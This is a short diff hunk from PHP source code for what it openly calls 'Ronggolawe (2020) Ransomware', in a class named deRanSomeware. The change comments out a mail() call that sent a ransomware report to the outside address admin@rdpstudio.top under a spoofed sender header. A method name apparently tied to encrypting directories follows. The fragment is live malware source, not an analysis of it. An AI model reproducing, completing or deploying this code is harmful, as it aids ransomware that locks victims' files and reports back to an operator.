@@ -114,7 +114,7 @@ class deRanSomeware
        $message.= "========= Ronggolawe (2020) Ransomware =========\n";
        $subject = "Report Ransomeware";
        $headers = "From: Ransomware <ransomeware@shor7cut.now>\r\n";
-       mail("admin@rdpstudio.top",$subject,$message,$headers);
+       //mail("admin@rdpstudio.top",$subject,$message,$headers);
    }
     
     public function shcEnDesDirS($locate,$method){
